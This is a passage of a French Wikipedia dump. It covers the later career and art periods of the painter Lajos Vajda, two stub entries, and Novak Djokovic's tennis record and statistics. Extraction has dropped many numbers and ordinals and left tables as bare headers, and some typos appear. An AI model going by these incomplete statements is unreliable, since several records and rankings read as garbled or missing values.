Il meurt le au sanatorium pulmonaire de Budakeszi. « Le lendemain matin, quand je suis monté à l'étage, il y avait la messe du dimanche sur le sol. Je lui ai demandé s'il voulait écouter. Si l'entendait gentiment, oui. Il n'a presque rien dit de toute la journée. Il ne s'accroche plus aux vivants, il parle de sa mère. Il est mort très calmement. » .
Postérité.
En 1943, Ernő Kállai organise une exposition commémorative en son honneur dans la Maison des artistes du travail. En 1946, Lajos Vajda est élu membre honoraire de l'École européenne. De 1948 à 1969, il est ignoré par le monde artistique officiel. Son œuvre est conservée par Júlia Vajda pendant près de deux décennies.En 1969, le musée du roi István à Székesfehérvár organise la première exposition de Lajos Vajda en son sein.
Périodes artistiques.
Périodes artistiques :
Photomontages (1930-1933).
Lajos Vajda voit dans l'art du cinéma « l'expression la plus appropriée des nouvelles aspirations de cette période ». « (...) Le cinéaste, qui crée des liens dans l'éparpillement aléatoire des objets et des destins, est capable de créer une nouvelle vision artistique du monde. » 
Dans les photomontages de Lajos Vajda, "les forces extrêmes du monde humain apparaissent dans une simultanéité dramatique : bébés morts et vieillards décrépits, couteaux et pain, fusils et oiseaux, tigres et lys - la loi de la jungle de la lutte pour l'existence et la composition de la tisane fleurie en diagonales tendues." 
Natures mortes (1934).
"Toutes ses natures mortes de 1934 utilisent les résultats de l'approche cubiste. Il transforme l'espace en avion. Le caractère autonome de l'image est si intime qu'au lieu d'une nature morte, c'est comme si on nous donnait un aperçu d'un monde hermétiquement fermé. Pourtant, son unité méthodiquement construite et compacte respire l'harmonie de l'existence vivante. Outre d'autres facteurs, cela est également dû à deux moments de la composition. L'un est le mode de représentation dans la vue, l'autre est la continuation involontaire dans l'imagination des plans qui forment le fond de l'image."
Line Drawings, Picture Montages (1935-1937).
De retour en Hongrie vers 1935, il commence à collecter des motifs à Szentendre et dans ses environs avec son ami Dezső Korniss. À côté des fenêtres, des façades de maison, des pierres tombales, des piliers de porte, il a dessiné une lampe à pétrole, une charrette de paysan ou une table sur laquelle se trouvent un couteau, une pomme et une miche de pain. Il ne s'intéresse pas tant aux origines des motifs qu'à ce qu'ils sont devenus, à la nouvelle signification qu'ils ont acquise dans un cadre de vie particulier. Il a d'abord dessiné les objets sur place, puis les a copiés les uns sur les autres. Parfois, il découpait les dessins et les collait ensemble pour en faire un montage. La plupart de ces images et dessins sont composés en cercle, et tous n'ont pas de fond spécifique.
Dans une lettre adressée à sa future épouse, Julia Richter, Lajos Vajda décrit les ambitions de la période entre 1935 et 1937. "Nous préférons laisser de côté les sentiments (ce qui ne veut pas dire que nous bannissons les sentiments humains de l'image), et nous préférons mettre l'accent principalement sur la constructivité, sur la mise en forme spatiale de l'image, et donc nous cherchons les sujets qui correspondent à notre approche, c'est-à-dire ce qui ferme - une unité formellement propre, ronde. Des choses architecturales, géométriques, avec ou sans figures humaines. Le paysage est inorganique et donc inapproprié pour exprimer ce que nous avons à dire. J'ai maintenant expérimenté la façon dont différents objets provenant de différents environnements, assemblés sur un plan d'image, ont un effet (sémantique surréaliste constructive."
La "sémantique surréaliste constructive" citée dans la lettre, suggère que "Vajda "assemble" effectivement ses cahiers, les étirant sur le plan de l'image ou du dessin, les transformant en un système organique et organique". L'autre élément de la méthode, surréaliste, indique que les éléments individuels s'emboîtent non seulement en termes de structure, mais aussi en termes de rêve, d'associations libres d'images, d'associations.".
Ses motifs forment un arbre "dans un ordre organique, organique". Sa méthode de travail : il découpe, colle sur le tableau selon un système de son cru et peint ensuite ses dessins. Lors de ses tournées de collecte de motifs dans et autour de la ville, Vajda a utilisé la méthode constructive du montage surréalisme pour combiner des objets quotidiens et sacrés, simplifiés en signes, avec des motifs folkloriques, comme dans son tableau "Maisons avec crucifix à Szentendre".
Sur la base des dessins de l'été, Korniss a développé les dessins dans l'atelier à l'huile et à la gouache, Vajda à la détrempe. Le , Vajda écrit à Julia Richter, réchauffant son meilleur ami de l'époque, Béla Korniss. Né en 1908, dans la "Grande" Hongrie. Vajda d'origine juive hongroise, influencé par les Serbes. Koniss : né à Szeklerland. (...) Nos aspirations sont de développer un nouvel art spécifique à l'Europe centrale et orientale, basé sur les influences françaises et oprosiennes des deux grands centres culturels européens. La position géographique de la Hongrie en Europe la prédestine à être un lien entre l'Occident (art français) et l'Orient (art russe). Nous voulons souder ensemble ce qui est culturellement (dans l'art) l'expression artistique des deux types de personnes à ces deux pôles : nous voulons être un constructeur de ponts 
Icônes (1936).
À travers une série d'images iconiques, il tente de réconcilier l'individu et la communauté, les sphères mondaines et transcendantes. Portrait avec icône de maintien est l'œuvre majeure de l'artiste. (Le titre du tableau n'est pas donné par le peintre)
Dans l'image, nous voyons deux visages : un visage aux traits personnels et une tête sphérique : "L'intersection des deux visages peut créer une "nouvelle lecture", un "troisième" portrait : le "vrai visage", le visage de l'homme, qui est la somme des qualités et des caractéristiques de l'icône impersonnelle, universelle, divine, le visage de l'homme, la tête de la sphère auratique, qui est composée de l'arc de cercle de la tête, des yeux et du nez du portrait individuel, et qui est donc tournée vers la gauche. " .
"Cette triple image, formée d'une multitude de taches pastel au mouvement dynamique, permet de multiples interprétations : outre l'évidente triade individu-général-communauté, l'image individuelle peut être vue comme représentative du corps, l'icône comme représentative de l'esprit, et le visage résultant de la synthèse des deux comme représentatif de l'âme. Berdyaev, un chrétien orthodoxe russe, parle de l'icône comme de la relation de l'homme-Dieu qui émerge de la relation bidirectionnelle entre l'homme et Dieu. (...) Dans le portrait qui émergeait de l'interpénétration de l'imagerie humaine et divine, Vajda présentait le "vrai" autoportrait définitif de lui-même, le visage de l'artiste qui, par le pouvoir de l'art, pouvait entrer en relation avec Dieu, avec le monde transcendant au-delà du tangible." 
Masques (1938).
Des nuages sombres à l'horizon. Mais la possibilité de synthèse s'estompe à l'ombre du fascisme et du stalinisme. Rejetant à la fois le fascisme et le stalinisme, Vajda s'est engagé sur la voie de la religiosité personnelle.
À partir de 1938, le paysage de Szentendre disparaît de son art. Sa place est prise par des paysages étranges, étrangers, avec des masques effrayants, parfois étranges, ou des créatures combinées à des masques. La plupart d'entre elles ont été réalisées au pastel, pour lesquelles Vajda a tiré parti des possibilités offertes par cette technique.
Plus tard, la nature des masques change, ne véhiculant plus des angoisses et des peurs, mais transportant le spectateur dans une autre dimension. Ils flottent tous les uns dans les autres, se transformant en une agitation onirique, mais ils projettent déjà la prochaine ère.
Paysages et créatures imaginaires (1938-1939).
"Ces œuvres de Vajda fperiodsemblent évoquer un âge préhistorique, ou peut-être plus encore un âge préhistorique uranien, où tout au plus quelques accessoires montrent les traces d'une civilisation d'antan. En regardant ces images, on a l'impression de voir les vestiges d'une fouille effectuée par les archéologues d'une civilisation autre que la culture humaine : des fragments gisant dans les sections de la fouille, mais sans clé visible, il n'y a aucun moyen de les interpréter correctement.
Cette évocation d'un monde sans homme n'est pas totalement inconnue dans l'art de cette période. Le plan, divisé en surfaces froides bleues et brunes, n'est séparé que par des formes ressemblant à des icebergs et à un naufrage. Personne depuis Caspar David Friedrich, l'un des plus grands représentants du romantisme allemand, n'a su transmettre avec autant de sensibilité la fragilité de l'existence humaine, confrontée à l'immensité de l'espace, au vide et à l'illimité de la nature, et à la vulnérabilité de la nature humaine." 
Dessins au fusain de la dernière année (1940).
Vajda travaille tout au long de l'été 1940, malgré l'aggravation de sa maladie, mais il soupçonne que son voyage touche à sa fin.
Les formes impeccables, gravées au fusain, aujourd'hui jaunies jusqu'à l'os, qui surgissent sur de grandes feuilles de papier d'emballage, ont le poids d'une vision. Ces formes flamboyantes et papillonnantes pénètrent dans l'auberge avec l'insistance d'une image rémanente regardant le soleil, dégageant un malaise et une anxiété extatique. Il y avait toutes les raisons de cette anxiété.
D'une part, il y a le destin personnel de Vajda lui-même : sa lutte de plus en plus désespérée avec sa maladie, avec l'ombre d'une personne non désirée mais à moitié morte. D'autre part, la réalité actuelle de la guerre mondiale, qui aux yeux de Vajdas (et de nombreux autres artistes européens) devient la tragédie d'une culture fondée sur des valeurs humanistes et des traditions culturelles.

</doc>
<doc id="7903531" url="https://fr.wikipedia.org/wiki?curid=7903531" title="Generic top-level domain">
Generic top-level domain



</doc>
<doc id="7903532" url="https://fr.wikipedia.org/wiki?curid=7903532" title="José Antonio García">
José Antonio García

José Antonio García peut désigner : 

</doc>
<doc id="7903534" url="https://fr.wikipedia.org/wiki?curid=7903534" title="Palmarès et statistiques de Novak Djokovic">
Palmarès et statistiques de Novak Djokovic

Cet article traite des différents résultats obtenus par Novak Djokovic, joueur de tennis serbe. À ce jour, Djokovic a remporté 101 titres ATP en simple dont les records de 24 tournois du Grand Chelem, 7 Masters et 40 Masters 1000. Il également remporté l'or olympique, la Coupe Davis 2010, l'ATP Cup 2020 et a passé à la place de numéro 1 mondial ce qui est le record historique. Il détient également le record du nombre d'années à avoir fini à la place de numéro 1 mondial (). En décrochant l'or aux Jeux olympiques d'été de 2024, il devient l'unique joueur à avoir remporté les seize titres les plus prestigieux du tennis en simple messieurs : les quatre tournois du Grand Chelem, la médaille d'or olympique, le Masters, la Coupe Davis et les 9 Masters 1000.
Principaux moments.
En , Djokovic remporte son premier Masters 1000 de sa carrière en s'imposant à Miami en battant notamment Rafael Nadal. Par la même occasion il intègre le Top 10 pour la première fois de sa carrière. Il remporte son second Masters 1000 la même année à la Rogers Cup en battant les numéros 1 et 2 mondiaux Roger Federer et Rafael Nadal. Il atteint la première finale d'un Grand Chelem de sa carrière à l'US Open où il s'incline face à Roger Federer. Il finit l'année à la place mondiale.
En , Djokovic gagne son premier titre du Grand Chelem en battant Jo-Wilfried Tsonga en finale de l'Open d'Australie en quatre sets. Djokovic devient ainsi le premier joueur serbe à gagner un titre du Grand Chelem en simple, et le plus jeune joueur de l'ère Open à atteindre les demi-finales ou mieux des quatre tournois du Grand Chelem. Il ajoute à son palmarès deux nouveaux Masters 1000 (Indian Wells et Rome) ainsi que le Masters de fin d'année en battant le Russe Nikolay Davydenko. Il remporte le bronze olympique lors des Jeux Olympiques de Pékin en 2008 face à l'Américain James Blake après avoir perdu contre Rafael Nadal en demi-finale. Il finit l'année à la place mondiale pour la seconde année consécutive.
Les saisons 2009 et 2010 sont en demi-teintes où Novak Djokovic alterne avec le bon et le mauvais ne s'imposant majoritairement que dans des tournois mineurs. Il remporte pour la première fois Paris-Bercy et n’atteint qu'une finale de Grand Chelem à l'US Open 2010. Avec l'équipe Serbe de Coupe Davis il remporte l'édition de Coupe Davis 2010 en battant en finale l'équipe de France de Coupe Davis. Il termine ces deux saisons à la place mondiale.
Djokovic commence la saison 2011 par une série de 41 victoires consécutives parmi lesquelles des victoires à l'Open d'Australie, à Indian Wells et à Miami. Pendant la saison sur terre battue, Djokovic bat Rafael Nadal en finale à Madrid, tournoi qu'il remporte pour la première fois et à Rome, ses premières victoires face à Nadal sur terre, avant de subir sa première défaite de l'année en demi-finale de Roland-Garros où il perd en quatre sets contre Roger Federer. À Wimbledon, Djokovic se défait du Français tête de série numéro 12 Jo-Wilfried Tsonga en demi-finale après avoir remonté un break de retard dans le premier set pour rejoindre sa première finale de Wimbledon et s'assurer d'être numéro 1 mondial pour la première fois de sa carrière. Djokovic bat Nadal en finale pour la cinquième fois de suite cette saison pour remporter son premier Wimbledon et son troisième titre du Grand Chelem. En , Djokovic bat le record du plus grand nombre de titres de Masters 1000 remportés sur une saison en s'adjugeant son cinquième Masters 1000 de l'année à la Rogers Cup. À l'US Open, Djokovic l'emporte sur Federer en sauvant deux balles de match, comme l'année précédente, alors qu'il était mené deux sets à zéro et 5-3 dans le dernier set. En finale, il bat Nadal en quatre sets pour remporter son premier US Open et son quatrième titre du Grand Chelem. Il finit l'année à la place pour la première fois de sa carrière.
En , Djokovic gagne son troisième Open d'Australie en battant Nadal dans la finale la plus longue de l'histoire en Grand Chelem. En juin, Djokovic atteint sa première finale à Roland-Garros et sa quatrième finale consécutive en Grand Chelem mais s'incline en quatre sets face à Nadal. Djokovic a alors atteint la finale des quatre tournois du Grand Chelem. En octobre, Djokovic bat Tomáš Berdych en deux sets pour aller en finale à Shanghai et ainsi avoir atteint la finale des neuf Masters 1000, tournoi qu'il remporte pour la première fois de sa carrière. Il remporte son deuxième Masters et finit l'année à la place pour la seconde fois.
En , Djokovic égale le record de Roger Federer et Andre Agassi du plus grand nombre de victoires à l'Open d'Australie dans l'ère Open en battant le numéro 3 mondial Andy Murray en finale pour remporter son quatrième Open d'Australie et son sixième titre du Grand Chelem. Il bat également le record de victoires consécutives à Melbourne avec trois titres d'affilée. En avril, Djokovic casse la série de 46 victoires consécutives de Rafael Nadal à Monte-Carlo en battant l'Espagnol en deux sets en finale. Avec ce premier succès à Monaco, Djokovic a alors gagné les trois Masters 1000 sur terre battue ainsi que huit des neuf tournois de cette catégorie. Il remporte son troisième Masters face à Rafael Nadal et termine l'année à la place mondiale.
En , après plus de dix sept mois sans remporter de titre du Grand Chelem, Djokovic bat Roger Federer en finale de Wimbledon pour remporter son septième titre du Grand Chelem. En , il monte sa série de victoires consécutives en Chine à 28 en battant David Ferrer en quarts de finale du Masters 1000 de Shanghai avant de perdre en demi-finale contre Federer. Il remporte pour la troisième année consécutive le Masters, son quatrième en carrière et finit l'année à la place mondiale.
En , Djokovic s'adjuge le record de l'ère Open du plus de victoires à l'Open d'Australie en battant le numéro 6 mondial Andy Murray en finale de l'Open d'Australie pour remporter son cinquième Open d'Australie et son huitième titre du Grand Chelem. En mars, il défend ses deux titres à Indian Wells et Miami et devient le premier tennisman à faire trois fois le doublé Indian Wells-Miami. Puis, quelques jours plus tard, il remporte Monte-Carlo, devenant ainsi le premier joueur de l'histoire à remporter les trois premiers "Masters 1000" de la saison. En mai, il conserve son titre à Rome et continue son début de saison hallucinant. En juillet, il conserve également son titre à Wimbledon avec 48 victoires et 3 défaites jusque là dans la saison. En septembre, il atteint la finale de l'US Open et réalise le premier Grand Chelem de finales de sa carrière. US Open qu'il remporte, pour atteindre la barre mythique des 10 titres en Grand Chelem. Début novembre, à la suite de sa victoire à Paris-Bercy, il devient le premier joueur à gagner 6 "Masters 1000" en une saison (pour 8 finales sur 8 tournois disputés, forfait à Madrid, ce qui est aussi un record). Fin novembre, il remporte son Masters, dont le de suite, ce qui est un record et finit à la première place mondiale pour la fois. Il conclut ainsi la deuxième meilleure saison de l'ère Open derrière celle de Rod Laver en 1969.
En , Djokovic remporte un Open d'Australie, il égale ainsi Roy Emerson au nombre de titres toutes époques confondues à Melbourne. C'est le du Grand Chelem de sa carrière égalant ainsi Björn Borg et Rod Laver. C'est aussi son Grand Chelem de rang (Wimbledon 2015, US Open 2015, Open d'Australie 2016). En , en battant Milos Raonic au Masters d'Indian Wells il remporte son "Masters 1000" et devient le codétenteur avec Rafael Nadal du plus grand nombre de titres dans cette catégorie. Au tournoi suivant, à Miami, il remporte son "Masters 1000", il devient ainsi le recordman de titres dans cette catégorie. C'est également son Indian Wells - Miami dont le de rang ce qui constitue un record dans les deux cas. À Roland-Garros, Djokovic remporte son douzième tournoi du Grand Chelem, le seul qui lui manquait, et devient le huitième joueur de l'histoire à remporter les quatre Grand Chelem et seulement le troisième joueur de l'histoire avec Donald Budge et Rod Laver à détenir les quatre tournois du Grand Chelem en même temps. Il est également le seul joueur de l'Histoire à détenir simultanément cinq titres Majeurs (Wimbledon 2015, US Open 2015, Masters 2015, Open d'Australie 2016, Roland Garros 2016). Après sa victoire à Roland-Garros il détient le record absolu de points au classement ATP avec . Il connaît par la suite une saison en dents de scie et finit l'année à la place mondiale.
En 2017, Djokovic met fin prématurément à sa saison en juillet à la suite d'une blessure au coude. Il ne remporte aucun titre majeur et finit l'année hors du top 10, une première depuis 2006.
En lors du Queen's, il atteint les 800 victoires en carrière ce que seul huit autres joueurs ont réussi auparavant. En , il remporte son titre du Grand Chelem en carrière à Wimbledon, deux ans après son dernier remporté à Roland-Garros et après son retour de blessure qui l'avait contraint à déclarer forfait en pour le reste de la saison. Cette victoire lui permet également de revenir dans le Top 10, une première depuis .
En , il remporte pour la première fois le Masters de Cincinnati accomplissant ainsi une "Career Golden Masters" en devenant le seul joueur de tennis à remporter au moins une fois les neuf Masters 1000 depuis leur création en 1990. En septembre 2018 lors de l'US Open, il remporte son titre sur le sol américain et son titre du Grand Chelem égalant son idole Pete Sampras n'ayant plus que ses rivaux historiques Rafael Nadal et Roger Federer devant lui. À la suite du forfait de Rafael Nadal au Masters de Paris-Bercy, il retrouve la place de numéro un mondial, deux ans après l'avoir perdue au profit d'Andy Murray. 2018 le voit également évoluer au sein du "team Europe" vainqueur de la Laver Cup. Avant le début du Masters, Rafael Nadal met un terme définitif à sa saison, assurant à Novak Djokovic de finir l'année à la place de numéro un mondial pour la fois de sa carrière. Il égale Jimmy Connors et Roger Federer n'ayant plus que Pete Sampras devant lui. Il devient l'unique joueur de tennis à finir numéro 1 mondial en fin d'année en ayant été au-delà du top 20 durant la saison.
En , Djokovic remporte un Open d'Australie, devenant l'unique recordman de titres à Melbourne, il remporte son titre du Grand Chelem et dépasse donc Pete Sampras. Également, il bat en finale son plus grand rival Rafael Nadal en trois sets devenant l'unique joueur à réussir cet exploit en finale d'un Grand Chelem. Il devient par ailleurs, le seul joueur à remporter une série de trois Grands Chelems à la suite à trois reprises, Roger Federer l’ayant réussi . En remportant une fois le Masters de Madrid en , il redevient co-recordman de titres (33) en Masters 1000 avec Rafael Nadal. En , pour une confrontation, Novak Djokovic et Roger Federer nous offrent la finale la plus longue de l'histoire de Wimbledon et qui sans doute restera dans la légende du tournoi. Au bout de quatre heures et cinquante-cinq minutes, Novak Djokovic, après avoir sauvé deux balles de match dans le cinquième set, remporte son seizième tournoi du Grand Chelem sur le score historique de (7-6, 1-6, 7-6, 4-6, 13-12). C’est la première finale de l’histoire du tournoi qui se termine sur un tie-break à 12-12. Le , il entame sa semaine à la tête du classement ATP, dépassant ainsi Ivan Lendl d'une semaine et se retrouve sur le podium historique. Il ne reste devant lui que Pete Sampras (286) et Roger Federer (310). En remportant son Masters de Paris-Bercy (record) et son Masters 1000, il s'adjuge son ATP en simple, ce qui lui permet d'intégrer le Top 5 des joueurs les plus titrés de l'histoire du tennis en égalant l'Américain John McEnroe.
En , il remporte la première édition de l'ATP Cup avec la Serbie en battant notamment l'Espagne de Rafael Nadal en finale. Il remporte ensuite son Open d'Australie devenant le troisième joueur de l'histoire du tennis avec Roger Federer et Rafael Nadal à avoir au moins 8 titres du Grand Chelem dans un même tournoi. Il devient également co-recordman avec Roger Federer du nombre de titres de Grand Chelem remportés sur surface dure (11). En , après une coupure de presque six mois dû au Covid-19, il renoue avec la victoire en remportant pour une seconde fois en carrière le Masters de Cincinnati. Avec cette victoire il redevient le co-recordman de titres gagnés en catégorie Masters 1000 (35) et de finales jouées (51) avec Rafael Nadal. Déjà unique joueur à avoir achevé le "Career Golden Masters" en 2018, avec cette victoire il est à présent détenteur d'au moins deux titres dans chaque tournoi en Masters 1000. En novembre, il est assuré de finir l'année à la première place mondiale pour une sixième année record rejoignant ainsi Pete Sampras en haut du classement.
En , il remporte son titre à l' Open d'Australie et reste invaincu en finale. Avec cette victoire, il devient le recordman unique de Grand Chelem remportés sur surface dure (12) devant le Suisse Roger Federer (11) pour un total de 18 Grand Chelem. Mais également, il est à présent le seul avec l'Espagnol Rafael Nadal à avoir remporté au moins 9 titres dans un même Grand Chelem, l’Ibère ayant 13 titres à Roland-Garros. &lt;br&gt;
Le 8 mars, le Serbe entame sa semaines en tant que numéro 1 et inscrit son nom encore plus dans l'histoire du tennis en devenant le recordman de semaines passées à la tête du classement ATP dépassant d'une semaine le Suisse Roger Federer qui détenait ce record depuis juillet 2012.&lt;br&gt;
En juin 2021, il réussit l'exploit de battre Rafael Nadal en 4 sets (3-6, 6-3, 7-6, 6-2) une seconde fois à Roland-Garros qui restait sur 105 victoires pour joués. Également, il devient le seul joueur de l'Ère Open à avoir atteint au minimum la finale, à six reprises, des quatre Grand Chelem. Il remporte son Roland-Garros après avoir été mené deux sets à zéro. Il est seulement le joueur à remonter un gap de 0-2 en finale de Grand Chelem et le premier à gagner un titre après avoir connu deux matchs avec un tel handicap sur le même tournoi. En outre, il devient le premier joueur de l'ère Open à avoir remporté au moins deux fois les quatre tournois du Grand Chelem et le troisième dans l'histoire du tennis après Roy Emerson et Rod Laver. C'est son titre du Grand Chelem. Il se rapproche pour la première fois de sa carrière à une unité du record co-détenu par Roger Federer et Rafael Nadal.&lt;br&gt;
En juillet 2021, il remporte son titre à Wimbledon. C'est ainsi le titre du Grand Chelem de sa carrière lui permettant de devenir co-recordman de titres avec Roger Federer et Rafael Nadal. Aussi, il est le premier joueur depuis Rod Laver en 1969 à avoir remporté les trois premiers tournois du Grand Chelem de l'année et donc être toujours en lice pour le Grand Chelem calendaire. Il est également à présent le seul joueur avec Roger Federer à avoir remporté au moins 6 titres du Grand Chelem dans deux tournois différents. Par ailleurs, avec un Petit Chelem, il égale le record de Roger Federer. Il est seulement le joueur de l'ère Open à faire le doublé Roland-Garros - Wimbledon la même saison. En novembre, il est assuré de finir l'année à la première place mondiale pour une septième année record devenant ainsi le premier joueur à réussir un tel exploit. À , et (au ) il devient le joueur le plus âgé à terminer une année en tête du classement ATP.
En mai 2022, au Masters de Rome, il remporte son match en carrière sur le circuit ATP, devenant le cinquième joueur à atteindre ce total après Jimmy Connors (1274), Roger Federer (1251), Ivan Lendl (1068) et Rafael Nadal (1051, en activité). À cette occasion, il remporte son Masters 1000 qui lui permet de prendre une avance de deux unités sur Rafael Nadal au classement du nombre de titres en Masters 1000 mais également de redevenir le joueur le plus âgé à gagner un Masters 1000 sur terre battue (, et ).&lt;br&gt;
En juillet 2022, il devient le premier joueur hommes et femmes incluses à avoir remporté au moins dans chacun des 4 tournois du Grand Chelem. Également, il devient le premier joueur homme à avoir atteint 32 finales dans cette catégorie dépassant Roger Federer d'une unité. Il remporte son titre à Wimbledon, c'est ainsi le titre du Grand Chelem de sa carrière lui permettant de se rapprocher à une unité du record de Rafael Nadal. Aussi, il est le premier joueur de l'histoire du tennis à avoir remporté au moins 7 titres dans deux tournois du Grand Chelem.&lt;br&gt;
En novembre 2022, il remporte un Masters record, il égale ainsi Roger Federer et devient le joueur le plus âgé à avoir remporté ce tournoi à et . De plus, il possède un total de dix-huit titres majeurs (Grand Chelem et Masters) remportés sur surfaces dures devant le Suisse avec dix-sept titres.
En janvier 2023, il devient le second joueur à faire une "Décima" en remportant son titre à l'Open d'Australie. C'est ainsi le titre du Grand Chelem de sa carrière lui permettant d'égaler le record de Rafael Nadal. Aussi, il redevient numéro un mondial et ajoute donc une année de plus record (12 au total) à cette place.&lt;br&gt; Le , avec passées à la tête du classement mondial, il devient le recordman historique du nombre de semaines passées en tant que numéro 1 mondial tous sexe confondus, en dépassant le record de Steffi Graf (377).&lt;br&gt;
En juin 2023, il remporte un titre à Roland-Garros et titre en Grand Chelem et devient pour la première fois de sa carrière l'unique recordman de titres en Grand Chelem devant Rafael Nadal (22). En outre, il devient également l'unique joueur de l'histoire du tennis masculin à avoir remporté au moins trois fois chaque Grand Chelem. À et , il est le joueur le plus âgé à avoir remporté la Coupe des Mousquetaires.&lt;br&gt;
En septembre 2023, il remporte son Grand Chelem à l'US Open devenant ainsi avec Margaret Smith Court, hommes et femmes confondus, le détenteur du plus grand nombres de titre en simple. C'est également, encore une fois, le plus vieux vainqueur de ce tournoi à 36 ans, 3 mois et 19 jours. 
En novembre 2023, au Masters de Turin, il s'assure de terminer l'année en tant que n°1 mondial pour la huitième fois de sa carrière, nouveau record qu'il co-détient avec Steffi Graf. Il s'assure par la même occasion de dépasser les 400 semaines passées au sommet de la hiérarchie mondiale.&lt;br&gt;
Le même mois, il remporte un Masters, devenant l'unique recordman de titres au Masters mais également rallonge d'une année le record du plus vieux vainqueur de ce tournoi (36 ans et 181 jours). Enfin, il remporte son titre sur surface dure, égalant le record jusqu'alors détenu par Roger Federer.
En avril 2024, il devient le joueur le plus âgé à occuper la place de N°1 mondial à 36 ans et 321 jours devant Roger Federer à 36 ans et 320 jours. &lt;br&gt;
En août 2024, il remporte l'or olympique aux Jeux olympiques 2024. Il devient ainsi, avec Andre Agassi, l'un des deux seuls joueurs de l'histoire à remporter tous les titres Majeurs (tournois du Grand Chelem, Masters et Jeux Olympiques), et le seul à remporter tous ces titres ainsi que tous les tournois Masters 1000. Il est également à 37 ans et 73 jours le plus vieux vainqueur de ce tournoi.
En mai 2025, il remporte le tournoi de Genève, signant ainsi le titre de sa carrière. Il devient alors le troisième joueur de l’histoire à atteindre la barre des 100 titres.
Finales importantes.
En Coupe Davis.
 : 3-2 &lt;br&gt;
1/4 de finale : 1-4 &lt;br&gt;
1/2 finale : 3-2 &lt;br&gt;
Finale : 3-2 
Statistiques de Novak Djokovic en Coupe Davis :
Statistiques de Novak Djokovic en Coupe Davis (2004-2023)
Palmarès.
Tableau mis à jour le .
"L'ATP prend en compte depuis 2019 les résultats des participants de la Laver Cup. À ce jour, Novak Djokovic connait un ratio victoire/défaite de 1/2."
Finales en simple (43).
Tournois non officiels :
Parcours au Masters.
! width="55"|Année
! width="115"|Lieu
! width="125"|Résultat
! width="125"|Tour
! width="210"|Adversaires
! width="150"|Victoire / Défaite
! width="150"|Scores
Parcours dans les Masters 1000.
En simple.
! width="50"|Année
! width="125"|Indian Wells
! width="125"|Miami
! width="125"|Monte-Carlo
! width="125"|Rome
! width="125"|Hambourg
! width="125"|Canada
! width="125"|Cincinnati
! width="125"|Madrid
! width="125"|Paris
! width="50"|
! width="125"|Indian Wells
! width="125"|Miami
! width="125"|Monte-Carlo
! width="125"|Rome
! width="125"|Madrid
! width="125"|Canada
! width="125"|Cincinnati
! width="125"|Shanghai
! width="125"|Paris
! width="50"|
! width="125"|Indian Wells
! width="125"|Miami
! width="125"|Monte-Carlo
! width="125"|Madrid
! width="125"|Rome
! width="125"|Canada
! width="125"|Cincinnati
! width="125"|Shanghai
! width="125"|Paris
En double.
! width="50"|Année
! width="80" colspan=2|Indian Wells
! width="80" colspan=2|Miami
! width="80" colspan=2|Monte-Carlo
! width="80" colspan=2|Hambourg puis Madrid
! width="80" colspan=2|Rome
! width="80" colspan=2|Canada
! width="80" colspan=2|Cincinnati
! width="80" colspan=2|Madrid puis Shanghai
! width="80" colspan=2|Paris
Tête de série en Grand Chelem.
Les tournois remportés par Djokovic sont en gras.
Confrontations avec ses principaux adversaires.
Confrontations lors des différents tournois ATP, des 4 tournois du Grand Chelem, des Jeux olympiques, en Coupe Davis, ATP Cup et Laver Cup avec ses principaux adversaires qui ont fait partie du top 10 (minimum 8 confrontations). Classement par pourcentage de victoires. Situation au .
Ce bilan ne prend pas en compte les confrontations en qualifications, en Challenger, Futures, ou durant le parcours junior des joueurs :
Récompenses.
Novak Djokovic a reçu de nombreux prix au cours de sa carrière, par des instances officielles (ATP) comme officieuses (médias, fondations), en vertu à la fois de ses résultats sportifs et de sa personnalité (fair-play, disponibilité envers les médias).
Résumé des gains annuels.
"Ci-dessous est établi un tableau récapitulatif des gains en tournoi de Novak Djokovic (au )."
Classements ATP en fin de saison.
Classement en simple et en double à l'issue de chaque saison (2003-2024) :
En tant que numéro 1 mondial.
"Mise à jour jusqu’à la semaine du "
Sur le podium.
"Mise à jour jusqu’à la semaine du "
Dans le Top 10.
"Mise à jour jusqu’à la semaine du "
Novak Djokovic est classé à la position des joueurs ayant passés le plus de semaine dans le top 10.
Se trouvent devant lui : Rafael Nadal (912) et Roger Federer (968).
Les joueurs en gras sont toujours en activité et dans le Top 10.
Records et statistiques diverses.
"Section mise à jour au "
En Grand Chelem.
Records détenus seul
Records partagés
Records non détenus.
"Mis à jour la semaine du 8 juillet 2024."
Séries de victoires.
43 victoires en 2010-2011
La série de 43 victoires de suite de Djokovic en 2010-2011 est la troisième plus longue de l'ère Open. Elle comprend également 41 victoires de suite à partir de début 2011, ce qui est la deuxième plus longue série de victoires pour commencer une année derrière celle de John McEnroe (42 victoires d'affilée pour le début d'année 1984).
38 victoires en indoor en 2012-2015
Depuis la défaite étrange face à Sam Querrey au Masters de Paris-Bercy 2012 où il menait pourtant 6-0, 2-0, Djokovic enchaîne une série de 38 victoires consécutives en indoor, principalement à Paris-Bercy, aux ATP Finals et en Coupe Davis. Roger Federer met fin à cette série lors de la phase de groupe du Masters 2015.
30 victoires en Grand Chelem en 2015-2016
La série de 30 victoires en Grand Chelem de Djokovic a commencé à Wimbledon en 2015 et est toujours en cours, le Serbe ayant réalisé un Grand Chelem non-calendaire grâce à ses 4 titres consécutifs en Grand Chelem. Cette série de 30 victoires est d'ailleurs un record dans l'ère Open, la meilleure performance de tous les temps appartenant à Donald Budge avec 36 victoires consécutives dans les années 1930. Elle prend fin après la défaite surprise contre Sam Querrey au de Wimbledon 2016.
30 victoires en Masters 1000 en 2014-2015
Depuis la défaite en deux sets face à Roger Federer en demi-finale du Masters de Shanghai 2014, Djokovic a gagné de suite, et a donc également remporté 5 tournois d'affilée dans cette catégorie. Cette série s'arrête en finale du Masters de Montréal 2015 face à un excellent Andy Murray.
29 victoires à Pékin en 2009-2015 (en cours)
Invaincu à Pékin, raflant 6 titres au passage, Djokovic a une série de 29 victoires de suite sans aucune défaite à l'Open de Chine. Série toujours en cours car il n'a jamais perdu le moindre match dans ce tournoi. Le record de l'Ere Open étant détenu par Rafael Nadal avec 31 victoires à Roland Garros.
28 victoires en Chine en 2012-2014
La série de 28 victoires en Chine de Djokovic a commencé à l'Open de Chine en 2012 et s'est arrêtée face à Roger Federer au Masters de Shanghai 2014.
Séries de finales.
17 finales consécutives en 2015-2016
